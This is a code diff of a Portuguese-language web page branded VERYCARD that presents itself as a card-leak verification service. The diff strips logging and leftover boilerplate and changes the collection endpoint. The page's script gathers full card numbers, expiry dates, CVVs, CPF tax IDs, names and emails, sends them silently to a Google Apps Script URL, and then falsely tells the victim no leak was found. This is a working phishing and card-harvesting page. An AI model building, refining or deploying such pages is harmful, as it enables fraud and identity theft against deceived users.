@@ -1,43 +1,4 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
@@ -283,38 +244,6 @@
         <p class="text-gray-400 mt-2">© 2025 VERYCARD. Todos os direitos reservados.</p>
     </footer>
 
-    <script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex));
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-    </script>
     <script>
         function toggleMenu() {
             const navLinks = document.getElementById('navLinks');
@@ -412,46 +341,37 @@
 
             // Validações
             let isValid = true;
-            console.log('Validando dados:', data);
             if (data.cardNumber.replace(/\D/g, '').length !== 16) {
-                console.log('Erro: Número do cartão inválido');
                 document.getElementById('cardNumberError').style.display = 'block';
                 isValid = false;
             }
             if (!/^\d{2}\/\d{2}$/.test(data.expiryDate)) {
-                console.log('Erro: Data de validade inválida');
                 document.getElementById('expiryDateError').style.display = 'block';
                 isValid = false;
             }
             if (data.cvv.length !== 3 || isNaN(data.cvv)) {
-                console.log('Erro: CVV inválido');
                 document.getElementById('cvvError').style.display = 'block';
                 isValid = false;
             }
             if (!data.cardType) {
-                console.log('Erro: Tipo de cartão não selecionado');
                 document.getElementById('cardTypeError').style.display = 'block';
                 isValid = false;
             }
             if (!data.fullName) {
-                console.log('Erro: Nome obrigatório');
                 document.getElementById('fullNameError').style.display = 'block';
                 isValid = false;
             }
             if (data.cpf.replace(/\D/g, '').length !== 11) {
-                console.log('Erro: CPF inválido');
                 document.getElementById('cpfError').style.display = 'block';
                 isValid = false;
             }
             if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
-                console.log('Erro: E-mail inválido');
                 document.getElementById('emailError').style.display = 'block';
                 isValid = false;
             }
 
             // Exibir mensagem geral se houver algum erro
             if (!isValid) {
-                console.log('Exibindo mensagem de erro geral');
                 generalError.style.display = 'block';
                 return;
             }
@@ -461,7 +381,7 @@
             button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Enviando...';
             button.classList.add('animate-pulse');
 
-            fetch('https://script.google.com/macros/s/AKfycbxOjhEU28wp0et3FkrE5UjbQWXRDkwBF0KxPkjQrNE3arfOwpehJ7WcC9fK64MODNEQ/exec', {
+            fetch('https://script.google.com/macros/s/AKfycbxselvxzYsLnIeebX-et35ixdAHe2CqGG3QrBTDNRM/exec', {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: {
@@ -470,7 +390,6 @@
                 body: new URLSearchParams(data).toString()
             })
             .then(response => {
-                console.log('Dados enviados com sucesso');
                 button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
                 button.classList.remove('animate-pulse');
                 alert(`Verificação concluída!\n\nNenhum vazamento detectado.\n\nDetalhes:\nCartão: ${data.cardNumber}\nTipo: ${data.cardType}\nCPF: ${data.cpf}\nNome: ${data.fullName}\nE-mail: ${data.email}\n\nUm relatório foi enviado para ${data.email}.`);
